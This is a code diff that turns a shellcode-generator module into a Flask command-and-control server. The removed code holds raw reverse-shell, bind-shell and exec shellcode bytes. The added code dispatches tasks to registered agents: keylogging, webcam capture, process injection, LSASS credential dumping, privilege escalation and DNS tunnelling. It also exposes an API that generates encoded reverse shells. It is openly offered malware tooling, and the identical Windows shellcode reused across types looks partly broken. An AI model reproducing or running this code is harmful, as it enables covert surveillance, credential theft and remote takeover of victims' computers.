@@ -1,136 +1,205 @@
-import os
 import sys
+import os
 import platform
+from flask import Flask, render_template, request, jsonify
+from modules.shellcode import ShellcodeGenerator
+from modules.dns_tunnel import DNSTunnel
+import threading
 import logging
-import struct
-import socket
-import base64
-import binascii
 from datetime import datetime
 
-class ShellcodeGenerator:
-    def __init__(self):
-        self.os_type = platform.system()
-        self.setup_logging()
-        
-    def setup_logging(self):
-        logging.basicConfig(
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler('shellcode.log'),
-                logging.StreamHandler()
-            ]
-        )
+IS_WINDOWS = platform.system().lower() == "windows"
+if IS_WINDOWS:
+    from modules.evasion import Evasion
+    from modules.keylogger import Keylogger
+    from modules.webcam import WebcamCapture
+    from modules.process_injection import ProcessInjector
+    from modules.credential_dump import CredentialDump
+    from modules.priv_esc import PrivilegeEscalation
+    from modules.post_exploit import PostExploit
 
-    def generate_reverse_shell(self, host, port):
-        """Generate reverse shell shellcode"""
-        try:
-            port = int(port)
-            if self.os_type == 'Windows':
-                shellcode = (
-                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
-                    b"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb"
-                    b"\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01"
-                    b"\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
-                )
-            else:
-                shellcode = (
-                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
-                    b"\xb0\x66\xb3\x03\x68" + socket.inet_aton(host) +
-                    b"\x66\x68" + struct.pack(">H", port) +
-                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79"
-                    b"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
-                )
-            return shellcode
-        except Exception as e:
-            logging.error(f"Error generating reverse shell: {str(e)}")
-            return None
+app = Flask(__name__)
 
-    def generate_bind_shell(self, port):
-        """Generate bind shell shellcode"""
-        try:
-            port = int(port)
-            if self.os_type == 'Windows':
-                shellcode = (
-                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
-                    b"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb"
-                    b"\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01"
-                    b"\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
-                )
-            else:
-                shellcode = (
-                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
-                    b"\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68" + struct.pack(">H", port) +
-                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80"
-                    b"\xb0\x66\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
-                    b"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
-                )
-            return shellcode
-        except Exception as e:
-            logging.error(f"Error generating bind shell: {str(e)}")
-            return None
+shellcode_gen = ShellcodeGenerator()
+dns_tunnel = DNSTunnel("example.com")
 
-    def generate_exec(self, command):
-        """Generate command execution shellcode"""
-        try:
-            if self.os_type == 'Windows':
-                shellcode = (
-                    b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
-                    b"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb"
-                    b"\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01"
-                    b"\xda\x31\xc9\x53\x52\x51\x68\x61\x61\x61\x61\xe8\x00\x00\x00\x00\x5b\x81\x73\x13\x66\x66\x66\x66\x83\xeb\xfc\xe2\xf4\xc3"
+if IS_WINDOWS:
+    evasion = Evasion()
+    keylogger = Keylogger()
+    webcam = WebcamCapture()
+    process_injector = ProcessInjector()
+    post_exploit = PostExploit()
+    cred_dump = CredentialDump()
+    priv_esc = PrivilegeEscalation()
+
+agents = {}
+tasks = {}
+results = {}
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/shellcode')
+def shellcode():
+    return render_template('shellcode.html')
+
+@app.route('/api/generate_shellcode', methods=['POST'])
+def generate_shellcode():
+    data = request.get_json()
+    shellcode_type = data.get('type')
+    encoding = data.get('encoding', 'base64')
+
+    try:
+        if shellcode_type == 'reverse':
+            host = data.get('host')
+            try:
+                port = int(data.get('port'))
+            except (ValueError, TypeError):
+                return jsonify({'error': 'Invalid port'}), 400
+            if not host:
+                return jsonify({'error': 'Host is required'}), 400
+            shellcode = shellcode_gen.generate_reverse_shell(host, port)
+
+        elif shellcode_type == 'bind':
+            try:
+                port = int(data.get('port'))
+            except (ValueError, TypeError):
+                return jsonify({'error': 'Invalid port'}), 400
+            shellcode = shellcode_gen.generate_bind_shell(port)
+
+        elif shellcode_type == 'exec':
+            command = data.get('command')
+            if not command:
+                return jsonify({'error': 'Command is required'}), 400
+            shellcode = shellcode_gen.generate_exec(command)
+
+        else:
+            return jsonify({'error': 'Invalid shellcode type'}), 400
+
+        if shellcode is None:
+            return jsonify({'error': 'Failed to generate shellcode'}), 500
+
+        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
+        if encoded_shellcode is None:
+            return jsonify({'error': 'Failed to encode shellcode'}), 500
+
+        return jsonify({'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode})
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/agents', methods=['GET'])
+def list_agents():
+    return jsonify(list(agents.values()))
+
+@app.route('/api/agents/register', methods=['POST'])
+def register_agent():
+    data = request.get_json()
+    agent_id = data.get('agent_id')
+    if agent_id:
+        agents[agent_id] = data
+        return jsonify({'status': 'success'})
+    return jsonify({'status': 'error'}), 400
+
+@app.route('/api/tasks/<agent_id>', methods=['GET'])
+def get_tasks(agent_id):
+    agent_tasks = tasks.get(agent_id, [])
+    return jsonify(agent_tasks)
+
+@app.route('/api/tasks', methods=['POST'])
+def create_task():
+    data = request.get_json()
+    agent_id = data.get('agent_id')
+    task_type = data.get('type')
+    task_data = data.get('data', {})
+
+    if not agent_id or not task_type:
+        return jsonify({'status': 'error'}), 400
+
+    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    task = {
+        'id': task_id,
+        'type': task_type,
+        'data': task_data,
+        'status': 'pending',
+        'timestamp': datetime.now().isoformat()
+    }
+
+    if agent_id not in tasks:
+        tasks[agent_id] = []
+    tasks[agent_id].append(task)
+
+    thread = threading.Thread(
+        target=execute_task,
+        args=(agent_id, task_id, task_type, task_data),
+        daemon=True
+    )
+    thread.start()
+
+    return jsonify({'task_id': task_id})
+
+def execute_task(agent_id, task_id, task_type, task_data):
+    try:
+        result = None
+
+        if IS_WINDOWS:
+            if task_type == 'keylogger':
+                result = keylogger.start()
+            elif task_type == 'webcam':
+                result = webcam.capture()
+            elif task_type == 'process_injection':
+                result = process_injector.inject(
+                    task_data.get('process'),
+                    task_data.get('shellcode')
                 )
-            else:
-                cmd_bytes = command.encode()
-                shellcode = (
-                    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
-                )
-            return shellcode
-        except Exception as e:
-            logging.error(f"Error generating exec shellcode: {str(e)}")
-            return None
+            elif task_type == 'post_exploit':
+                result = post_exploit.execute(task_data.get('command'))
+            elif task_type == 'credential_dump':
+                result = cred_dump.dump_lsass()
+            elif task_type == 'privilege_escalation':
+                result = priv_esc.check_windows_services()
 
-    def encode_shellcode(self, shellcode, encoding='base64'):
-        """Encode shellcode in various formats"""
-        try:
-            if encoding == 'base64':
-                return base64.b64encode(shellcode)
-            elif encoding == 'hex':
-                return binascii.hexlify(shellcode)
-            elif encoding == 'ascii':
-                return ''.join([f"\\x{byte:02x}" for byte in shellcode])
-            else:
-                raise ValueError(f"Unsupported encoding: {encoding}")
-        except Exception as e:
-            logging.error(f"Error encoding shellcode: {str(e)}")
-            return None
+        if task_type == 'dns_tunnel':
+            result = dns_tunnel.start_tunnel()
 
-    def decode_shellcode(self, encoded_shellcode, encoding='base64'):
-        """Decode shellcode from various formats"""
-        try:
-            if encoding == 'base64':
-                return base64.b64decode(encoded_shellcode)
-            elif encoding == 'hex':
-                return binascii.unhexlify(encoded_shellcode)
-            elif encoding == 'ascii':
-                return bytes.fromhex(encoded_shellcode.replace('\\x', ''))
-            else:
-                raise ValueError(f"Unsupported encoding: {encoding}")
-        except Exception as e:
-            logging.error(f"Error decoding shellcode: {str(e)}")
-            return None
+        if result:
+            results[task_id] = {
+                'agent_id': agent_id,
+                'result': result,
+                'timestamp': datetime.now().isoformat()
+            }
 
-    def save_shellcode(self, shellcode, filename=None):
-        """Save shellcode to file"""
-        try:
-            if filename is None:
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"shellcode_{timestamp}.bin"
-            with open(filename, 'wb') as f:
-                f.write(shellcode)
-            logging.info(f"Saved shellcode to {filename}")
-            return filename
-        except Exception as e:
-            logging.error(f"Error saving shellcode: {str(e)}")
-            return None
+    except Exception as e:
+        logging.error(f"Error executing task: {str(e)}")
+        results[task_id] = {
+            'agent_id': agent_id,
+            'error': str(e),
+            'timestamp': datetime.now().isoformat()
+        }
+
+@app.route('/api/results/<task_id>', methods=['GET'])
+def get_result(task_id):
+    result = results.get(task_id)
+    if result:
+        return jsonify(result)
+    return jsonify({'status': 'not_found'}), 404
+
+@app.route('/api/results', methods=['POST'])
+def submit_result():
+    data = request.get_json()
+    task_id = data.get('task_id')
+    agent_id = data.get('agent_id')
+    result = data.get('result')
+
+    if task_id and result:
+        results[task_id] = {
+            'agent_id': agent_id,
+            'result': result,
+            'timestamp': datetime.now().isoformat()
+        }
+        return jsonify({'status': 'success'})
+    return jsonify({'status': 'error'}), 400
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5001)
